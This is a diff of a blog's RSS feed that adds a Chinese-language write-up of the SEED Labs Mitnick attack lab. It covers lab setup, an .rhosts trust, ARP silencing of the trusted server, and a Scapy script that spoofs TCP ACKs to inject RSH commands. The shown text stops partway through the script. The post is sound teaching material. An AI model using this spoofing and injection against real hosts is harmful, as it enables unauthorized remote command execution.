@@ -7,17 +7,529 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Thaumazein</copyright>
-        <lastBuildDate>Mon, 25 May 2026 22:08:02 +0800</lastBuildDate><atom:link href="https://th4uma.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sun, 31 May 2026 16:24:02 +0800</lastBuildDate><atom:link href="https://th4uma.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Mitnick攻击</title>
+        <link>https://th4uma.github.io/post/mitnick/</link>
+        <pubDate>Sun, 31 May 2026 16:24:02 +0800</pubDate>
+        
+        <guid>https://th4uma.github.io/post/mitnick/</guid>
+        <description>&lt;img src="https://th4uma.github.io/images/cover/mitnick.jpg" alt="Featured image of post Mitnick攻击" /&gt;&lt;h2 id=&#34;实验环境&#34;&gt;实验环境
+&lt;/h2&gt;&lt;h3 id=&#34;基础环境&#34;&gt;基础环境
+&lt;/h3&gt;&lt;p&gt;我使用的是 Ubuntu  24.04.4，基本环境配置见&lt;a class=&#34;link&#34; href=&#34;https://th4uma.github.io/post/arp/#%e5%87%86%e5%a4%87&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;ARP攻击原理学习&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;网络结构如下：&lt;/p&gt;
+&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;节点&lt;/th&gt;
+					&lt;th&gt;IP 地址&lt;/th&gt;
+					&lt;th&gt;作用&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;攻击机&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;10.9.0.1&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;伪造身份并发送攻击报文&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;X-Terminal&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;10.9.0.5&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;受害主机&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Trusted Server&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;10.9.0.6&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;被受害者信任的服务器&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;启动实验前先停止并清理容器环境，防止被之前的网络配置干扰&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo docker stop $(sudo docker ps -q) 2&amp;gt;/dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo docker system prune -f
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;进入实验目录并启动&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cd seed-labs/category-network/Mitnick_Attack/Labsetup
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo docker compose up -d
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;打开三个终端分别进入对应的容器&lt;/p&gt;
+&lt;p&gt;攻击者：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker &lt;span class=&#34;nb&#34;&gt;exec&lt;/span&gt; -it seed-attacker /bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;受害者：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker &lt;span class=&#34;nb&#34;&gt;exec&lt;/span&gt; -it x-terminal-10.9.0.5 /bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;受信任服务器：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker &lt;span class=&#34;nb&#34;&gt;exec&lt;/span&gt; -it trusted-server-10.9.0.6 /bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;建立信任关系&#34;&gt;建立信任关系
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;Mitnick 攻击的原理就是利用受害者和服务器的信任关系，因此实验开始前必须先进行配置&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;在受害者容器中切换到 &lt;code&gt;seed&lt;/code&gt; 用户，配置&lt;code&gt;.rhosts&lt;/code&gt;文件来信任来自服务器的连接&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;su seed
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ~
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;touch .rhosts
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; 10.9.0.6 &amp;gt; .rhosts
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chmod &lt;span class=&#34;m&#34;&gt;644&lt;/span&gt; .rhosts
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;.rhosts&lt;/code&gt;是声明当前主机信任哪些远程主机的文件，写入&lt;code&gt;10.9.0.6&lt;/code&gt;表示信任来自服务器的远程访问请求&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;在服务器容器中切换到 &lt;code&gt;seed&lt;/code&gt; 用户，用 &lt;code&gt;rsh&lt;/code&gt; 远程执行命令获取受害者时间，如果返回正确的受害者系统时间而且不需要输入密码，说明信任关系建立成功&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;su seed
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rsh 10.9.0.5 date
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;img src=&#34;1.png&#34; style=&#34;width: 90%;&#34; /&gt;
+&lt;h2 id=&#34;阻断真实服务器&#34;&gt;阻断真实服务器
+&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;攻击的关键是伪造受信任服务器的身份，然后和受害者建立连接。为了防止真实服务器收到伪造包后回复RST关闭连接，攻击者需要让真实服务器暂时无法正常回应。一般会使用 SYN 洪泛攻击让服务器无法处理正常连接&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;这个实验使用静态 ARP 映射来模拟洪泛攻击效果。首先在受害者容器把 &lt;code&gt;10.9.0.6&lt;/code&gt; 映射到一个不存在的 MAC 地址，让受害者发往服务器的报文无法真正到达&lt;/p&gt;
+&lt;p&gt;输入&lt;code&gt;exit&lt;/code&gt;退出&lt;code&gt;seed&lt;/code&gt;进入&lt;code&gt;root&lt;/code&gt;，然后输入下面的命令修改受害者的arp缓存&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;arp -s 10.9.0.6 aa:bb:cc:dd:ee:ff
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;arp -n
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;可以看到修改前受害者可以ping通服务器，修改后就全部丢包，之后服务器就无法对实验产生任何干扰了，相当于静默状态&lt;/p&gt;
+&lt;img src=&#34;2.png&#34; style=&#34;width: 90%;&#34; /&gt;
+&lt;h2 id=&#34;伪造-tcp-连接与-rsh-会话&#34;&gt;伪造 TCP 连接与 RSH 会话
+&lt;/h2&gt;&lt;p&gt;攻击者伪造受信任服务器的 IP 地址，向受害者发起连接，盲猜 TCP 序列号完成握手。连接建立后，再通过 RSH 协议注入命令&lt;/p&gt;
+&lt;h3 id=&#34;修改攻击脚本&#34;&gt;修改攻击脚本
+&lt;/h3&gt;&lt;p&gt;打开 &lt;code&gt;volumes/spoof_ack_plus_data.py&lt;/code&gt;，将注入命令改成创建 &lt;code&gt;/tmp/mitnick&lt;/code&gt; 文件：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;srv_port2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;seed&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;seed&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;touch /tmp/mitnick&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;输入&lt;code&gt;ip addr&lt;/code&gt;确认攻击者容器的网卡名，找到 &lt;code&gt;10.9.0.1&lt;/code&gt; 对应的网卡，我这里是叫&lt;code&gt;br-302e4ba285b3&lt;/code&gt;&lt;/p&gt;
+&lt;img src=&#34;3.png&#34; style=&#34;width: 90%;&#34; /&gt;
+&lt;p&gt;将所有攻击脚本末尾 &lt;code&gt;sniff()&lt;/code&gt; 函数中的 &lt;code&gt;iface&lt;/code&gt; 改成实际的网卡名，否则脚本正常运行，但实际上抓不到目标的通信流量&lt;/p&gt;
+&lt;h3 id=&#34;执行攻击&#34;&gt;执行攻击
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;在攻击机容器中需要开启三个终端，并行运行三个脚本&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;终端 1 运行 &lt;code&gt;spoof_ack_plus_data.py&lt;/code&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; volumes
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 spoof_ack_plus_data.py
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这个脚本负责盲猜序列号，伪造 ACK 完成握手，并发送 RSH 命令数据、&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/python3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;scapy.all&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;time&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;x_ip&lt;/span&gt;      &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;10.9.0.5&amp;#34;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# X-Terminal&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;srv_ip&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;10.9.0.6&amp;#34;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# The trusted server&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;x_port&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;514&lt;/span&gt;         &lt;span class=&#34;c1&#34;&gt;# Port number used by X-Terminal&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;srv_port&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1023&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;# Port number used by the trusted server&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;srv_port2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;9090&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;syn_seq&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x1000&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;# Initial sequence number&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Spoof the ACK to finish 3-way handshake initiated by the attacker&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# After that, spoof a rsh data packet&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# We are only allowed to use the sequence number in the captured packet&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;spoof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pkt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;old_tcp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pkt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;TCP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;old_tcp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flags&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;SA&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;c1&#34;&gt;# Spoof ACK to finish the handshake protocol&lt;/span&gt;
